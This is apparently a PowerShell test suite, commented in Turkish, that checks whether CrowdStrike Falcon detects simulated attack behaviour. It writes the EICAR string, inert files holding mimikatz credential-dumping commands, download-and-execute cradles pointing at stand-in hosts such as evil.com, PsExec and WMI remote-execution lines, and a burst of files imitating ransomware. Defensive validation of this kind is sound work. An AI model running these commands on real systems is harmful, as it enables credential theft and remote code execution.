<#
.SYNOPSIS
    CrowdStrike Falcon Detection Test Suite
    
.DESCRIPTION
    Bu script CrowdStrike Falcon'un endpoint'lerde düzgün çalışıp çalışmadığını test eder.
    SADECE TEST ORTAMINDA KULLANIN!
    
.NOTES
    Author: Security Team
    Test Type: EDR Detection Validation
    Platform: CrowdStrike Falcon
    Risk Level: Safe (uses EICAR and benign test methods)
#>

param(
    [switch]$Verbose,
    [string]$LogPath = "$env:TEMP\CrowdStrikeTest_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"
)

# Renkli çıktı için
function Write-TestResult {
    param($Message, $Type = "Info")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMessage = "[$timestamp] [$Type] $Message"
    
    switch($Type) {
        "Success" { Write-Host $logMessage -ForegroundColor Green }
        "Warning" { Write-Host $logMessage -ForegroundColor Yellow }
        "Error" { Write-Host $logMessage -ForegroundColor Red }
        "Info" { Write-Host $logMessage -ForegroundColor Cyan }
    }
    
    Add-Content -Path $LogPath -Value $logMessage
}

# CrowdStrike sensor kontrolü
function Test-CrowdStrikeSensor {
    Write-TestResult "CrowdStrike Falcon Sensor kontrolü yapılıyor..." "Info"
    
    $csAgent = Get-Service -Name "CSAgent" -ErrorAction SilentlyContinue
    $csfalcon = Get-Service -Name "CSFalconService" -ErrorAction SilentlyContinue
    
    if ($csAgent -or $csfalcon) {
        if (($csAgent -and $csAgent.Status -eq 'Running') -or ($csfalcon -and $csfalcon.Status -eq 'Running')) {
            Write-TestResult "CrowdStrike Falcon Sensor çalışıyor" "Success"
            return $true
        } else {
            Write-TestResult "CrowdStrike Sensor yüklü ama çalışmıyor!" "Error"
            return $false
        }
    } else {
        Write-TestResult "CrowdStrike Falcon Sensor bulunamadı!" "Error"
        return $false
    }
}

# Banner
Clear-Host
Write-Host "=" * 70 -ForegroundColor Cyan
Write-Host "  CROWDSTRIKE FALCON DETECTION TEST SUITE" -ForegroundColor Cyan
Write-Host "  Test Environment Only - Safe Detection Tests" -ForegroundColor Yellow
Write-Host "=" * 70 -ForegroundColor Cyan
Write-Host ""

Write-TestResult "Test başlatılıyor..." "Info"
Write-TestResult "Log dosyası: $LogPath" "Info"
Write-Host ""

# Sensor kontrolü
if (-not (Test-CrowdStrikeSensor)) {
    Write-Host ""
    Write-Host "HATA: CrowdStrike Falcon Sensor aktif değil!" -ForegroundColor Red
    Write-Host "Lütfen sensor'ün yüklü ve çalışır durumda olduğundan emin olun." -ForegroundColor Yellow
    Write-Host ""
    pause
    exit
}

Write-Host ""

# Test sayacı
$testNumber = 0
$detectedCount = 0
$totalTests = 10

# ============================================================================
# TEST 1: EICAR Test Dosyası
# ============================================================================
$testNumber++
Write-Host "[$testNumber/$totalTests] EICAR Standart Test Dosyası" -ForegroundColor White
Write-TestResult "EICAR test dosyası oluşturuluyor..." "Info"

try {
    $eicarString = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$' + 'EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
    $eicarPath = "$env:TEMP\eicar_test.com"
    
    Set-Content -Path $eicarPath -Value $eicarString -NoNewline
    Start-Sleep -Seconds 3
    
    if (Test-Path $eicarPath) {
        Write-TestResult "UYARI: EICAR dosyası tespit EDİLMEDİ!" "Warning"
        Remove-Item -Path $eicarPath -Force -ErrorAction SilentlyContinue
    } else {
        Write-TestResult "BAŞARILI: EICAR dosyası tespit edildi ve engellendi" "Success"
        $detectedCount++
    }
} catch {
    Write-TestResult "BAŞARILI: EICAR yazma girişimi engellendi (prevention mode)" "Success"
    $detectedCount++
}

Write-Host ""

# ============================================================================
# TEST 2: Mimikatz String Tespiti (IOA)
# ============================================================================
$testNumber++
Write-Host "[$testNumber/$totalTests] IOA Tespiti - Credential Access String'leri" -ForegroundColor White
Write-TestResult "Mimikatz benzeri string'ler test ediliyor..." "Info"

try {
    $mimikatzContent = @"
REM SADECE TEST - Bu gerçek mimikatz değildir
REM CrowdStrike IOA tespitini test eder

REM Credential Dumping Commands (Test Only)
REM mimikatz.exe
REM sekurlsa::logonpasswords
REM privilege::debug
REM token::elevate
REM lsadump::sam
REM lsadump::secrets
REM lsadump::cache

Test file for Indicator of Attack detection
"@
    
    $mimikatzPath = "$env:TEMP\cred_dump_test.txt"
    Set-Content -Path $mimikatzPath -Value $mimikatzContent
    
    Start-Sleep -Seconds 3
    
    if (Test-Path $mimikatzPath) {
        Write-TestResult "INFO: String-based IOA tespiti aktif değil (normal olabilir)" "Info"
        Remove-Item -Path $mimikatzPath -Force -ErrorAction SilentlyContinue
    } else {
        Write-TestResult "BAŞARILI: IOA string tespiti çalışıyor" "Success"
        $detectedCount++
    }
} catch {
    Write-TestResult "BAŞARILI: Dosya yazma engellendi" "Success"
    $detectedCount++
}

Write-Host ""

# ============================================================================
# TEST 3: PowerShell Download Cradle (Behavioral IOA)
# ============================================================================
$testNumber++
Write-Host "[$testNumber/$totalTests] Behavioral IOA - PowerShell Download Cradle" -ForegroundColor White
Write-TestResult "Şüpheli PowerShell pattern test ediliyor..." "Info"

try {
    $downloadCradle = @'
<#
SADECE TEST - Bu script gerçekte çalıştırılmaz
CrowdStrike'ın PowerShell behavioral detection'ını test eder

Malicious patterns (commented out):
IEX (New-Object Net.WebClient).DownloadString('http://malicious.example.com/payload.ps1')
Invoke-Expression (Invoke-WebRequest -Uri 'http://evil.com/script' -UseBasicParsing).Content
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

Test purpose only - no actual execution
#>
Write-Host "PowerShell Download Cradle Test - No actual download occurs"
'@
    
    $psPath = "$env:TEMP\download_cradle_test.ps1"
    Set-Content -Path $psPath -Value $downloadCradle
    
    Start-Sleep -Seconds 3
    
    if (Test-Path $psPath) {
        Write-TestResult "INFO: PowerShell script file tespiti aktif değil" "Info"
        Remove-Item -Path $psPath -Force -ErrorAction SilentlyContinue
    } else {
        Write-TestResult "BAŞARILI: Şüpheli PowerShell pattern tespit edildi" "Success"
        $detectedCount++
    }
} catch {
    Write-TestResult "BAŞARILI: Script yazma engellendi" "Success"
    $detectedCount++
}

Write-Host ""

# ============================================================================
# TEST 4: Suspicious Process Execution - LSASS Memory Access Pattern
# ============================================================================
$testNumber++
Write-Host "[$testNumber/$totalTests] Process Behavior - LSASS Access Pattern" -ForegroundColor White
Write-TestResult "LSASS process query test ediliyor..." "Info"

try {
    # LSASS process'ini query et (okuma - zararsız)
    $lsassProcess = Get-Process -Name "lsass" -ErrorAction Stop
    
    if ($lsassProcess) {
        Write-TestResult "INFO: LSASS process query başarılı" "Info"
        
        # CrowdStrike bu tür query'leri loglar ama engellemez (normal operation)
        Write-TestResult "INFO: LSASS monitoring active (query logged but not blocked)" "Info"
    }
} catch {
    Write-TestResult "UYARI: LSASS process'ine erişim engellendi (beklenen değil)" "Warning"
    $detectedCount++
}

Write-Host ""

# ============================================================================
# TEST 5: Rapid File Creation (Ransomware Behavior)
# ============================================================================
$testNumber++
Write-Host "[$testNumber/$totalTests] Machine Learning IOA - Ransomware Behavior" -ForegroundColor White
Write-TestResult "Hızlı dosya oluşturma pattern test ediliyor..." "Info"

try {
    $testFolder = "$env:TEMP\rapid_file_test_cs"
    New-Item -ItemType Directory -Path $testFolder -Force | Out-Null
    
    $filesCreated = 0
    $fileExtensions = @('.doc', '.xls', '.pdf', '.txt', '.jpg')
    
    for ($i = 1; $i -le 50; $i++) {
        try {
            $ext = $fileExtensions[$i % $fileExtensions.Count]
            $fileName = "document_$i$ext"
            $filePath = Join-Path $testFolder $fileName
            
            $content = "Original content $i - " + (Get-Random)
            Set-Content -Path $filePath -Value $content
            
            if (Test-Path $filePath) {
                $filesCreated++
            }
            
            # Hızlı oluşturma simülasyonu
            Start-Sleep -Milliseconds 50
        } catch {
            break
        }
    }
    
    Start-Sleep -Seconds 3
    
    if ($filesCreated -ge 45) {
        Write-TestResult "INFO: Ransomware behavioral pattern engellemedi ($filesCreated/50)" "Info"
    } else {
        Write-TestResult "BAŞARILI: Ransomware behavior tespit edildi ve engellendi ($filesCreated/50)" "Success"
        $detectedCount++
    }
    
    Remove-Item -Path $testFolder -Recurse -Force -ErrorAction SilentlyContinue
} catch {
    Write-TestResult "BAŞARILI: Dosya işlemi engellendi (ML-based detection)" "Success"
    $detectedCount++
}

Write-Host ""

# ============================================================================
# TEST 6: Lateral Movement - PsExec Pattern
# ============================================================================
$testNumber++
Write-Host "[$testNumber/$totalTests] Lateral Movement IOA - Remote Execution Pattern" -ForegroundColor White
Write-TestResult "PsExec benzeri pattern test ediliyor..." "Info"

try {
    $psexecTest = @"
REM SADECE TEST - Gerçek PsExec değildir
REM CrowdStrike lateral movement IOA'sını test eder

REM PsExec commands (not executed):
REM psexec.exe \\target -u admin -p password cmd.exe
REM psexec.exe \\192.168.1.100 -s cmd.exe
REM PSEXESVC service installation pattern

Test for lateral movement detection
"@
    
    $psexecPath = "$env:TEMP\psexec_pattern_test.txt"
    Set-Content -Path $psexecPath -Value $psexecTest
    
    Start-Sleep -Seconds 3
    
    if (Test-Path $psexecPath) {
        Write-TestResult "INFO: Static PsExec string tespiti aktif değil (file-based)" "Info"
        Remove-Item -Path $psexecPath -Force -ErrorAction SilentlyContinue
    } else {
        Write-TestResult "BAŞARILI: Lateral movement pattern tespit edildi" "Success"
        $detectedCount++
    }
} catch {
    Write-TestResult "BAŞARILI: Dosya yazma engellendi" "Success"
    $detectedCount++
}

Write-Host ""

# ============================================================================
# TEST 7: Suspicious Registry Activity - Persistence
# ============================================================================
$testNumber++
Write-Host "[$testNumber/$totalTests] Persistence IOA - Registry Run Key" -ForegroundColor White
Write-TestResult "Registry persistence pattern test ediliyor..." "Info"

try {
    # Test registry path (non-critical)
    $testRegPath = "HKCU:\Software\CrowdStrikeTest"
    
    if (-not (Test-Path $testRegPath)) {
        New-Item -Path $testRegPath -Force | Out-Null
        New-ItemProperty -Path $testRegPath -Name "TestValue" -Value "SafeTest_$(Get-Date -Format 'yyyyMMddHHmmss')" -PropertyType String -Force | Out-Null
        
        Start-Sleep -Seconds 2
        
        if (Test-Path $testRegPath) {
            Write-TestResult "INFO: Non-critical registry değişikliği başarılı (beklenen)" "Info"
            Remove-Item -Path $testRegPath -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
    
    # CrowdStrike critical Run key'leri izler ama test key'i engelmez
    Write-TestResult "INFO: Registry monitoring aktif (critical keys protected)" "Info"
    
} catch {
    Write-TestResult "UYARI: Registry işlemi engellendi" "Warning"
}

Write-Host ""

# ============================================================================
# TEST 8: WMI Command Execution (Living off the Land)
# ============================================================================
$testNumber++
Write-Host "[$testNumber/$totalTests] Living off the Land - WMI Execution Pattern" -ForegroundColor White
Write-TestResult "WMI process spawn pattern test ediliyor..." "Info"

try {
    # Normal WMI query (non-suspicious)
    $explorerProcess = Get-WmiObject -Class Win32_Process -Filter "Name='explorer.exe'" -ErrorAction Stop
    
    if ($explorerProcess) {
        Write-TestResult "INFO: Normal WMI query başarılı (expected)" "Info"
    }
    
    # Şüpheli WMI pattern'i comment olarak test et
    $wmiTestScript = @'
# WMI Process Spawn Test (NOT EXECUTED)
# Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "powershell.exe -enc <base64>"
# Get-WmiObject -Namespace root\cimv2 -Class Win32_Process -Filter "Name='lsass.exe'"

Test for WMI-based execution pattern detection
'@
    
    $wmiPath = "$env:TEMP\wmi_execution_test.ps1"
    Set-Content -Path $wmiPath -Value $wmiTestScript
    
    Start-Sleep -Seconds 3
    
    if (Test-Path $wmiPath) {
        Write-TestResult "INFO: WMI script file tespiti aktif değil (execution-based detection)" "Info"
        Remove-Item -Path $wmiPath -Force -ErrorAction SilentlyContinue
    } else {
        Write-TestResult "BAŞARILI: WMI execution pattern tespit edildi" "Success"
        $detectedCount++
    }
    
} catch {
    Write-TestResult "UYARI: WMI erişimi engellendi" "Warning"
}

Write-Host ""

# ============================================================================
# TEST 9: DLL Injection Pattern (Process Injection IOA)
# ============================================================================
$testNumber++
Write-Host "[$testNumber/$totalTests] Process Injection IOA - DLL Injection Pattern" -ForegroundColor White
Write-TestResult "Process injection pattern test ediliyor..." "Info"

try {
    $injectionTest = @"
/*
SADECE TEST - Bu kod çalıştırılmaz
CrowdStrike process injection IOA'sını test eder

API calls commonly used for injection (not executed):
- VirtualAllocEx()
- WriteProcessMemory()
- CreateRemoteThread()
- NtQueueApcThread()
- SetThreadContext()

Reflective DLL injection pattern
Process hollowing techniques
*/

Test for process injection behavioral detection
"@
    
    $injectionPath = "$env:TEMP\injection_pattern_test.txt"
    Set-Content -Path $injectionPath -Value $injectionTest
    
    Start-Sleep -Seconds 3
    
    if (Test-Path $injectionPath) {
        Write-TestResult "INFO: Static injection string tespiti aktif değil (API-call based)" "Info"
        Remove-Item -Path $injectionPath -Force -ErrorAction SilentlyContinue
    } else {
        Write-TestResult "BAŞARILI: Process injection pattern tespit edildi" "Success"
        $detectedCount++
    }
} catch {
    Write-TestResult "BAŞARILI: Dosya yazma engellendi" "Success"
    $detectedCount++
}

Write-Host ""

# ============================================================================
# TEST 10: Suspicious Network Connection Pattern
# ============================================================================
$testNumber++
Write-Host "[$testNumber/$totalTests] Network IOA - Beaconing Pattern Detection" -ForegroundColor White
Write-TestResult "Network connection pattern test ediliyor..." "Info"

try {
    # Test domain (EICAR related - safe)
    $testDomain = "www.eicar.org"
    
    try {
        $dnsResult = Resolve-DnsName -Name $testDomain -ErrorAction Stop
        
        if ($dnsResult) {
            Write-TestResult "INFO: DNS çözümleme başarılı (test domain)" "Info"
        }
        
        # CrowdStrike network monitoring için kısa bekleme
        Start-Sleep -Seconds 2
        
        Write-TestResult "INFO: Network IOA monitoring aktif (connections logged)" "Info"
        
    } catch {
        Write-TestResult "INFO: DNS sorgusu başarısız (network izole olabilir)" "Info"
    }
    
} catch {
    Write-TestResult "UYARI: Network işlemi engellendi" "Warning"
}

Write-Host ""

# ============================================================================
# FALCON SENSOR STATUS CHECK
# ============================================================================
Write-Host "=" * 70 -ForegroundColor Cyan
Write-Host "  FALCON SENSOR STATUS" -ForegroundColor Cyan
Write-Host "=" * 70 -ForegroundColor Cyan
Write-Host ""

# Sensor bilgilerini topla
try {
    $csAgent = Get-Service -Name "CSAgent" -ErrorAction SilentlyContinue
    $csfalcon = Get-Service -Name "CSFalconService" -ErrorAction SilentlyContinue
    
    Write-Host "Sensor Service Status:" -ForegroundColor White
    if ($csAgent) {
        Write-Host "  CSAgent: " -NoNewline
        if ($csAgent.Status -eq 'Running') {
            Write-Host "Running" -ForegroundColor Green
        } else {
            Write-Host $csAgent.Status -ForegroundColor Red
        }
    }
    
    if ($csfalcon) {
        Write-Host "  CSFalconService: " -NoNewline
        if ($csfalcon.Status -eq 'Running') {
            Write-Host "Running" -ForegroundColor Green
        } else {
            Write-Host $csfalcon.Status -ForegroundColor Red
        }
    }
    
    # Falcon registry bilgileri
    $falconReg = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\CSAgent\Sim" -ErrorAction SilentlyContinue
    if ($falconReg) {
        Write-Host "`nFalcon Configuration:" -ForegroundColor White
        if ($falconReg.CU) {
            Write-Host "  Customer ID (CID): " -NoNewline
            Write-Host $falconReg.CU.Substring(0, 8) -ForegroundColor Cyan
            Write-Host "  (truncated for security)"
        }
    }
    
    Write-Host ""
} catch {
    Write-TestResult "Sensor detayları alınamadı" "Warning"
}

# ============================================================================
# SONUÇLAR
# ============================================================================
Write-Host "=" * 70 -ForegroundColor Cyan
Write-Host "  TEST SONUÇLARI" -ForegroundColor Cyan
Write-Host "=" * 70 -ForegroundColor Cyan
Write-Host ""

$detectionRate = [math]::Round(($detectedCount / $totalTests) * 100, 2)

Write-Host "Toplam Test: " -NoNewline
Write-Host $totalTests -ForegroundColor White
Write-Host "Tespit Edilen: " -NoNewline
Write-Host $detectedCount -ForegroundColor Green
Write-Host "Tespit Oranı: " -NoNewline
Write-Host "$detectionRate%" -ForegroundColor $(if($detectionRate -ge 75){"Green"}elseif($detectionRate -ge 50){"Yellow"}else{"Red"})
Write-Host ""

# CrowdStrike özel yorumlama
Write-Host "CROWDSTRIKE DETECTION ANALİZİ:" -ForegroundColor Yellow
Write-Host ""

if ($detectionRate -ge 20) {
    Write-TestResult "SONUÇ: CrowdStrike Falcon çalışıyor - EDR tespitleri aktif" "Success"
    Write-Host ""
    Write-Host "Not: CrowdStrike birçok davranışı ENGELLEME yerine LOGLAMA modunda çalışır." -ForegroundColor Cyan
    Write-Host "Düşük tespit oranı NORMAL olabilir. Önemli olan:" -ForegroundColor Cyan
    Write-Host "  1. Falcon Console'da event'lerin görünmesi" -ForegroundColor White
    Write-Host "  2. Detection'ların loglanması" -ForegroundColor White
    Write-Host "  3. Prevention policy'ye göre aksiyonlar" -ForegroundColor White
} elseif ($detectionRate -ge 10) {
    Write-TestResult "SONUÇ: CrowdStrike Falcon aktif ama detection mode'da" "Warning"
    Write-Host ""
    Write-Host "Prevention policy kontrol edin - sadece detection mode olabilir" -ForegroundColor Yellow
} else {
    Write-TestResult "SONUÇ: CrowdStrike Falcon tespiti çok düşük - inceleme gerekli" "Error"
    Write-Host ""
    Write-Host "Olası sorunlar:" -ForegroundColor Red
    Write-Host "  - Sensor tam bağlanmamış olabilir" -ForegroundColor White
    Write-Host "  - Prevention policy aktif değil" -ForegroundColor White
    Write-Host "  - Host isolation aktif olabilir" -ForegroundColor White
}

Write-Host ""
Write-TestResult "Detaylı log: $LogPath" "Info"
Write-Host ""
Write-Host "ÖNEMLİ: FALCON CONSOLE KONTROLÜ" -ForegroundColor Yellow
Write-Host "=" * 70 -ForegroundColor Yellow
Write-Host "1. Falcon Console → Investigate → Activity Logs" -ForegroundColor White
Write-Host "2. Hostname ile arama yapın" -ForegroundColor White
Write-Host "3. Son 1 saatteki event'leri filtreleyin" -ForegroundColor White
Write-Host "4. Detection type'lara göre sıralayın:" -ForegroundColor White
Write-Host "   - Malware detections (EICAR)" -ForegroundColor Cyan
Write-Host "   - IOA detections (Behavioral patterns)" -ForegroundColor Cyan
Write-Host "   - Machine Learning detections" -ForegroundColor Cyan
Write-Host "5. Prevention policy'nizi kontrol edin (Detect vs Prevent)" -ForegroundColor White
Write-Host ""
Write-Host "BEKLENEN DAVRANIŞLAR:" -ForegroundColor Yellow
Write-Host "- EICAR: Prevention mode'da bloke edilmeli" -ForegroundColor White
Write-Host "- IOA'lar: Detect edilmeli (prevention policy'ye göre bloke edilebilir)" -ForegroundColor White
Write-Host "- Behavioral: ML detection loglanmalı" -ForegroundColor White
Write-Host "=" * 70 -ForegroundColor Yellow
Write-Host ""
